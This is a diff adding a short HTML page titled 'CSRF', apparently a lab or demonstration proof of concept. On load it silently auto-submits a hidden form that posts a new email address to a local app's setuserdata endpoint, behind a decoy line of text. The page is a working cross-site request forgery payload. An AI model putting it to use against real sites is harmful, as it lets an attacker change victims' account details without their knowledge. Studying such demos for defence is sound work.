@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSRF</title>
+  </head>
+  <body onload="document.querySelector('form').submit()">
+    <p>No cat pictures.</p>
+    <form method="post" action="http://localhost:8000/setuserdata/">
+      <input type="hidden" name="email" id="email" value="csrf@csrf.com" />
+    </form>
+  </body>
+</html>
